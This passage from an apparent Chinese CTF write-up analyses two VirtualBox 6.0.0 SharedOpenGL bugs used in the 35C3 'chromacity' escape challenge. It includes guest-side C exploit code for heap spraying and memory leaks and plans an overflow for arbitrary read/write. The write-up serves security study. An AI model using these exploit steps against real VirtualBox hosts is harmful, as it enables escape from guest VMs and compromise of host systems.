<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rc = crVBoxServerClientRead(u32ClientID, pWriteback, &amp;cbWriteback);</span><br><span class="line"></span><br><span class="line">if (RT_SUCCESS(rc))</span><br><span class="line">&#123;</span><br><span class="line">    /* Update parameters.*/</span><br><span class="line">    paParms[1].u.pointer.size = cbWriteback;</span><br><span class="line">&#125;</span><br><span class="line">/* Return the required buffer size always */</span><br><span class="line">paParms[2].u.uint32 = cbWriteback;</span><br><span class="line"></span><br><span class="line">svcFreeBuffer(pSvcBuffer);</span><br></pre></td></tr></table></figure>
<p>我们可以写出如下的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">   int idClient = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);</span><br><span class="line">   printf(&quot;idClient=%d\n&quot;,idClient);</span><br><span class="line">   set_version(idClient);</span><br><span class="line">   getchar();</span><br><span class="line">   uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type</span><br><span class="line">                0x66666666, //conn_id</span><br><span class="line">                1, //numOpcodes</span><br><span class="line">                0x12345678,</span><br><span class="line">                0x61616161</span><br><span class="line">                &#125;;</span><br><span class="line">   crmsg(idClient,msg,sizeof(msg));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x02-35C3CTF-Virtualbox-NDay"><a href="#0x02-35C3CTF-Virtualbox-NDay" class="headerlink" title="0x02 35C3CTF Virtualbox NDay"></a>0x02 35C3CTF Virtualbox NDay</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">chromacity 477</span><br><span class="line">Solves: 2</span><br><span class="line">Please escape VirtualBox. 3D acceleration is enabled for your convenience.</span><br><span class="line">​</span><br><span class="line">No need to analyze the 6.0 patches, they should not contain security fixes.</span><br><span class="line">​</span><br><span class="line">Once you&#x27;re done, submit your exploit at https://vms.35c3ctf.ccc.ac/, but assume that all passwords are different on the remote setup.</span><br><span class="line">​</span><br><span class="line">Challenge files. Password for the encrypted VM image is the flag for &quot;sanity check&quot;.</span><br><span class="line">​</span><br><span class="line">Setup</span><br><span class="line">​</span><br><span class="line">UPDATE: You might need to enable nested virtualization.</span><br><span class="line">​</span><br><span class="line">Hint: https://github.com/niklasb/3dpwn/ might be useful</span><br><span class="line">​</span><br><span class="line">Hint 2: this photo was taken earlier today at C3</span><br><span class="line">​</span><br><span class="line">Difficulty estimate: hard</span><br></pre></td></tr></table></figure>
<p>题目的VirtualBox为6.0.0版本，通过参考资料已经知道了第一个漏洞点出在<code>crUnpackExtendGetUniformLocation</code>函数</p>
<h3 id="crUnpackExtendGetUniformLocation"><a href="#crUnpackExtendGetUniformLocation" class="headerlink" title="crUnpackExtendGetUniformLocation"></a>crUnpackExtendGetUniformLocation</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void crUnpackExtendGetUniformLocation(void)</span><br><span class="line">&#123;</span><br><span class="line">    int packet_length = READ_DATA(0, int);</span><br><span class="line">    GLuint program = READ_DATA(8, GLuint);</span><br><span class="line">    const char *name = DATA_POINTER(12, const char);</span><br><span class="line">    SET_RETURN_PTR(packet_length-16);</span><br><span class="line">    SET_WRITEBACK_PTR(packet_length-8);</span><br><span class="line">    cr_unpackDispatch.GetUniformLocation(program, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数没有检查<code>packet_length</code>，而该字段是我们从Guest中通过HGCM和Chromium协议传入的数据中的，因此完全可控。<br>为了触发调用该函数，我们使用如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">   int idClient = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);</span><br><span class="line">   printf(&quot;idClient=%d\n&quot;,idClient);</span><br><span class="line">   set_version(idClient);</span><br><span class="line">   getchar();</span><br><span class="line">   int offset = 0x200;</span><br><span class="line">   uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type</span><br><span class="line">                0x66666666, //conn_id</span><br><span class="line">                1, //numOpcodes</span><br><span class="line">                CR_EXTEND_OPCODE &lt;&lt; 24,</span><br><span class="line">                offset, //packet_length</span><br><span class="line">                CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode</span><br><span class="line">                0, //program</span><br><span class="line">                *(uint32_t *)&quot;leak&quot; //name</span><br><span class="line">                &#125;;</span><br><span class="line">   crmsg(idClient,msg,sizeof(msg));</span><br><span class="line">   for (int i=0;i&lt;100;i++) &#123;</span><br><span class="line">      printf(&quot;%02x &quot;,crmsg_buf[i]);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过调试可以知道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c</span><br><span class="line">   346 void crUnpackExtendGetUniformLocation(void)</span><br><span class="line">   347 &#123;</span><br><span class="line">   348     int packet_length = READ_DATA(0, int);</span><br><span class="line">   349     GLuint program = READ_DATA(8, GLuint);</span><br><span class="line">   350     const char *name = DATA_POINTER(12, const char);</span><br><span class="line"> ► 351     SET_RETURN_PTR(packet_length-16);</span><br><span class="line">   352     SET_WRITEBACK_PTR(packet_length-8);</span><br><span class="line">   353     cr_unpackDispatch.GetUniformLocation(program, name);</span><br><span class="line">   354 &#125;</span><br><span class="line">   355 </span><br><span class="line">pwndbg&gt; x /20bx cr_unpackData+0x200-16</span><br><span class="line">0x7f1adc9a03d0:	0x08	0x19	0x00	0x00	0x01	0x14	0x00	0x00</span><br><span class="line">0x7f1adc9a03d8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00</span><br><span class="line">0x7f1adc9a03e0:	0xfa	0x6c	0x28	0xf2</span><br></pre></td></tr></table></figure>
<p>SET_RETURN_PTR操作将<code>cr_unpackData+packet_length-16</code>处的数据拷贝到了Guest中的<code>crmsg_buf</code>中，于是我们可以利用起来进行越界内存地址泄露<br><img src="https://p3.ssl.qhimg.com/t016d090de09bc4677b.png"><br>为了泄露地址，我们首先使用<code>heap spray</code>布置堆风水。<br>首先，我们得了解一下当我们与<code>SharedOpenGL</code>服务建立连接时，会创建哪些结构体，当与服务连接时，<code>svcConnect</code>会被HGCM协议调用进行连接初始化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static DECLCALLBACK(int) svcConnect (void *, uint32_t u32ClientID, void *pvClient, uint32_t fRequestor, bool fRestoring)</span><br><span class="line">&#123;</span><br><span class="line">    RT_NOREF(pvClient, fRequestor, fRestoring);</span><br><span class="line"></span><br><span class="line">    if (g_u32fCrHgcmDisabled)</span><br><span class="line">    &#123;</span><br><span class="line">        WARN((&quot;connect not expected&quot;));</span><br><span class="line">        return VERR_INVALID_STATE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Log((&quot;SHARED_CROPENGL svcConnect: u32ClientID = %d\n&quot;, u32ClientID));</span><br><span class="line"></span><br><span class="line">    int rc = crVBoxServerAddClient(u32ClientID);</span><br><span class="line"></span><br><span class="line">    return rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>crVBoxServerAddClient函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int32_t crVBoxServerAddClient(uint32_t u32ClientID)</span><br><span class="line">&#123;</span><br><span class="line">    CRClient *newClient;</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">    newClient = (CRClient *) crCalloc(sizeof(CRClient));</span><br><span class="line"> .....</span><br><span class="line">    newClient-&gt;conn = crNetAcceptClient(cr_server.protocol, NULL,</span><br><span class="line">                                        cr_server.tcpip_port,</span><br><span class="line">                                        cr_server.mtu, 0);</span><br><span class="line">.................</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>crNetAcceptClient函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CRConnection *</span><br><span class="line">crNetAcceptClient( const char *protocol, const char *hostname,</span><br><span class="line">                                     unsigned short port, unsigned int mtu, int broker )</span><br><span class="line">&#123;</span><br><span class="line">    CRConnection *conn;</span><br><span class="line">...................</span><br><span class="line">    conn = (CRConnection *) crCalloc( sizeof( *conn ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这里申请了结构体<code>CRClient</code>和结构体<code>CRConnection</code>的内存。其中<code>CRClient</code>大小为<code>0x9d0</code>，<code>CRConnection</code>大小为<code>0x298</code></p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>我们首先申请N个这么些大小的堆，用于消耗内存碎片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//heap spray</span><br><span class="line">for (int i=0;i&lt;600;i++) &#123;</span><br><span class="line">   alloc_buf(client,0x298,&quot;CRConnection_size_fill&quot;,23);</span><br><span class="line">&#125;</span><br><span class="line">for (int i=0;i&lt;600;i++) &#123;</span><br><span class="line">   alloc_buf(client,0x9d0,&quot;CRClient_size_fill&quot;,23);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后接下来建立一个新的<code>VBoxSharedCrOpenGL</code>服务，由于前面内存碎片耗尽，此时的<code>VBoxSharedCrOpenGL</code>服务申请的<code>CRClient</code>和<code>CRConnection</code>很可能相邻</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//CRClient和CRConnection结构体将被创建</span><br><span class="line">int new_client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);</span><br><span class="line">for (int i=0;i&lt;600;i++) &#123;</span><br><span class="line">   alloc_buf(client,0x298,&quot;CRConnection_size_fill&quot;,23);</span><br><span class="line">&#125;</span><br><span class="line">for (int i=0;i&lt;600;i++) &#123;</span><br><span class="line">   alloc_buf(client,0x9d0,&quot;CRClient_size_fill&quot;,23);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来，我们将<code>new_client</code>释放,然后使用同样大小的crmsg的buf占位，并且控制OPCODE使得程序进入<code>crUnpackExtendGetUniformLocation</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//释放CRClient和CRConnection结构体</span><br><span class="line">hgcm_disconnect(new_client);</span><br><span class="line"></span><br><span class="line">uint32_t msg[] = &#123;CR_MESSAGE_OPCODES, //type</span><br><span class="line">             0x66666666, //conn_id</span><br><span class="line">             1, //numOpcodes</span><br><span class="line">             CR_EXTEND_OPCODE &lt;&lt; 24,</span><br><span class="line">             OFFSET_PCLIENT, //packet_length</span><br><span class="line">             CR_GETUNIFORMLOCATION_EXTEND_OPCODE, //extend opcode</span><br><span class="line">             0, //program</span><br><span class="line">             *(uint32_t *)&quot;leak&quot; //name</span><br><span class="line">             &#125;;</span><br><span class="line">//将crmsg的unpack_buffer申请占位到之前的CRConnection结构体位置，从而进行数据泄露</span><br><span class="line">crmsg(client,0x298,msg,sizeof(msg));</span><br></pre></td></tr></table></figure>
<p>那么此时的<code>cr_unpackData</code>与原来<code>new_client</code>的空间重合，由于crmsg使用的buf是通过<code>svcGetBuffer</code>生成的，而之前分析过<code>svcGetBuffer</code>是通过<code>RTMemAlloc(cbBufferSize);</code>来申请堆的，<code>RTMemAlloc</code>函数不会清除原空间的内容，调试如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/sea/Desktop/VirtualBox-6.0.0/src/VBox/HostServices/SharedOpenGL/unpacker/unpack_shaders.c</span><br><span class="line">   343     cr_unpackDispatch.GetAttribLocation(program, name);</span><br><span class="line">   344 &#125;</span><br><span class="line">   345 </span><br><span class="line">   346 void crUnpackExtendGetUniformLocation(void)</span><br><span class="line">   347 &#123;</span><br><span class="line"> ► 348     int packet_length = READ_DATA(0, int);</span><br><span class="line">   349     GLuint program = READ_DATA(8, GLuint);</span><br><span class="line">   350     const char *name = DATA_POINTER(12, const char);</span><br><span class="line">   351     SET_RETURN_PTR(packet_length-16);</span><br><span class="line">   352     SET_WRITEBACK_PTR(packet_length-8);</span><br><span class="line">   353     cr_unpackDispatch.GetUniformLocation(program, name);</span><br><span class="line">pwndbg&gt; tel cr_unpackData 100</span><br><span class="line">00:0000│ rdi 0x7fb89214f080 ◂— 0xa400000248</span><br><span class="line">01:0008│     0x7fb89214f088 ◂— 0x6b61656c00000000</span><br><span class="line">02:0010│     0x7fb89214f090 ◂— 0x0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">05:0028│     0x7fb89214f0a8 ◂— 0xffffffff</span><br><span class="line">06:0030│     0x7fb89214f0b0 ◂— 0x0</span><br><span class="line">... ↓        9 skipped</span><br><span class="line">10:0080│     0x7fb89214f100 ◂— 0x3e8000003e800</span><br><span class="line">11:0088│     0x7fb89214f108 ◂— 0x0</span><br><span class="line">12:0090│     0x7fb89214f110 ◂— 0x0</span><br><span class="line">13:0098│     0x7fb89214f118 ◂— 0x100000000</span><br><span class="line">14:00a0│     0x7fb89214f120 ◂— 0x0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">17:00b8│     0x7fb89214f138 ◂— 0x1b58</span><br><span class="line">18:00c0│     0x7fb89214f140 —▸ 0x7fb8a5cfc00c (crVBoxHGCMAlloc) ◂— push   rbp</span><br><span class="line">19:00c8│     0x7fb89214f148 —▸ 0x7fb8a5cfcd4e (crVBoxHGCMFree) ◂— push   rbp</span><br><span class="line">1a:00d0│     0x7fb89214f150 —▸ 0x7fb8a5cfc982 (crVBoxHGCMSend) ◂— push   rbp</span><br><span class="line">1b:00d8│     0x7fb89214f158 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>因此这里我们无需用到越界读也能泄露出原来<code>CRConnection</code>中的信息，我们泄露出位于<code>0x248</code>处的<code>pClient</code>地址以后，重新建立了一个新的<code>VBoxSharedCrOpenGL</code>服务，以便我们后续劫持该服务中的<code>CRConnection</code>中一些函数指针，从而控制程序流程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">uint64_t client_addr = *(uint64_t *)(crmsg_buf+0x10);</span><br><span class="line">//重新将新的CRClient和CRConnection结构体占位与此</span><br><span class="line">new_client = hgcm_connect(&quot;VBoxSharedCrOpenGL&quot;);</span><br><span class="line">LeakClient lc = &#123;</span><br><span class="line">     .new_client = new_client,</span><br><span class="line">     .client_addr = client_addr</span><br><span class="line">&#125;;</span><br><span class="line">/*for (int i=0;i&lt;100;i++) &#123;</span><br><span class="line">   printf(&quot;%02x &quot;,crmsg_buf[i]);</span><br><span class="line">&#125;*/</span><br><span class="line">return lc;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="crUnpackExtendShaderSource"><a href="#crUnpackExtendShaderSource" class="headerlink" title="crUnpackExtendShaderSource"></a>crUnpackExtendShaderSource</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>现在来看第二个漏洞<code>crUnpackExtendShaderSource</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">void crUnpackExtendShaderSource(void)</span><br><span class="line">&#123;</span><br><span class="line">    GLint *length = NULL;</span><br><span class="line">    GLuint shader = READ_DATA(8, GLuint);</span><br><span class="line">    GLsizei count = READ_DATA(12, GLsizei);</span><br><span class="line">    GLint hasNonLocalLen = READ_DATA(16, GLsizei);</span><br><span class="line">    GLint *pLocalLength = DATA_POINTER(20, GLint);</span><br><span class="line">    char **ppStrings = NULL;</span><br><span class="line">    GLsizei i, j, jUpTo;</span><br><span class="line">    int pos, pos_check;</span><br><span class="line"></span><br><span class="line">    if (count &gt;= UINT32_MAX / sizeof(char *) / 4)</span><br><span class="line">    &#123;</span><br><span class="line">        crError(&quot;crUnpackExtendShaderSource: count %u is out of range&quot;, count);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos = 20 + count * sizeof(*pLocalLength);</span><br><span class="line"></span><br><span class="line">    if (hasNonLocalLen &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        length = DATA_POINTER(pos, GLint);</span><br><span class="line">        pos += count * sizeof(*length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pos_check = pos;</span><br><span class="line"></span><br><span class="line">    if (!DATA_POINTER_CHECK(pos_check))</span><br><span class="line">    &#123;</span><br><span class="line">        crError(&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;, pos_check);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        if (pLocalLength[i] &lt;= 0 || pos_check &gt;= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))</span><br><span class="line">        &#123;</span><br><span class="line">            crError(&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;, pos_check);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pos_check += pLocalLength[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ppStrings = crAlloc(count * sizeof(char*));</span><br><span class="line">    if (!ppStrings) return;</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        ppStrings[i] = DATA_POINTER(pos, char);</span><br><span class="line">        pos += pLocalLength[i];</span><br><span class="line">        if (!length)</span><br><span class="line">        &#123;</span><br><span class="line">            pLocalLength[i] -= 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Assert(pLocalLength[i] &gt; 0);</span><br><span class="line">        jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];</span><br><span class="line">        for (j = 0; j &lt; jUpTo; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            char *pString = ppStrings[i];</span><br><span class="line"></span><br><span class="line">            if (pString[j] == &#x27;\0&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                Assert(j == jUpTo - 1);</span><br><span class="line">                pString[j] = &#x27;\n&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//    cr_unpackDispatch.ShaderSource(shader, count, ppStrings, length ? length : pLocalLength);</span><br><span class="line">    cr_unpackDispatch.ShaderSource(shader, 1, (const char**)ppStrings, 0);</span><br><span class="line"></span><br><span class="line">    crFree(ppStrings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数的中间的一个循环，每次循环开始，检查前一次累加出的pos_check是否越界，显然经过这样的检查，<code>pos_check</code>肯定在<code>INT32_MAX</code>范围内，但是后一个范围即<code>DATA_POINTER_CHECK(pos_check)</code>的检查则不一定了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; count; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        if (pLocalLength[i] &lt;= 0 || pos_check &gt;= INT32_MAX - pLocalLength[i] || !DATA_POINTER_CHECK(pos_check))</span><br><span class="line">        &#123;</span><br><span class="line">            crError(&quot;crUnpackExtendShaderSource: pos %d is out of range&quot;, pos_check);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        pos_check += pLocalLength[i];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>因为对于最后一次的循环，<code>pLocalLength[i];</code>可以为任意大小的值，将其累加到<code>pos_check</code>上面以后，就退出了循环，没有再次检查<code>pos_check</code>是否还在<code>DATA_POINTER</code>范围内。由于上述的检查不充分，下方的循环将导致溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Assert(pLocalLength[i] &gt; 0);</span><br><span class="line">jUpTo = i == count -1 ? pLocalLength[i] - 1 : pLocalLength[i];</span><br><span class="line">for (j = 0; j &lt; jUpTo; ++j)</span><br><span class="line">&#123;</span><br><span class="line">    char *pString = ppStrings[i];</span><br><span class="line"></span><br><span class="line">    if (pString[j] == &#x27;\0&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        Assert(j == jUpTo - 1);</span><br><span class="line">        pString[j] = &#x27;\n&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然存在<code>Assert(j == jUpTo - 1);</code>的检查，但是对于<code>release</code>版本，在编译时<code>Assert</code>会被去掉。因此，上述代码可以溢出指定长度，并将后方为空字节的数据替换为<code>\n</code>。</p>
<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>对于这种溢出，一个好的利用方式就是通过它将\0替换为\n的特性将某些类似于Buffer的对象的length修改，从而使得该Buffer能够越界溢出，进而控制其他对象。<br>前面<code>SHCRGL_GUEST_FN_WRITE_BUFFER</code>命令创建的<code>CRVBOXSVCBUFFER_t</code>对象是一个很好的选择，该对象结构如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _CRVBOXSVCBUFFER_t &#123;</span><br><span class="line">    uint32_t uiId;</span><br><span class="line">    uint32_t uiSize;</span><br><span class="line">    void*    pData;</span><br><span class="line">    _CRVBOXSVCBUFFER_t *pNext, *pPrev;</span><br><span class="line">&#125; CRVBOXSVCBUFFER_t;</span><br></pre></td></tr></table></figure>
<p>将该对象布局到<code>cr_unpackData</code>后方，通过溢出，可以将<code>CRVBOXSVCBUFFER_t</code>中的<code>uiSize</code>改大，从而使得该<code>CRVBOXSVCBUFFER_t</code>能够溢出。假设在该<code>CRVBOXSVCBUFFER_t</code>的<code>pData</code>指向的内存后方还有一个<code>CRVBOXSVCBUFFER_t</code>,那么通过溢出，可以控制后面整个<code>CRVBOXSVCBUFFER_t</code>，从而实现任意地址读写。<br>首先通过申请大量的<code>Buffer</code>，消耗内存碎片，最后申请的几个Buffer就很大可能连续</p>
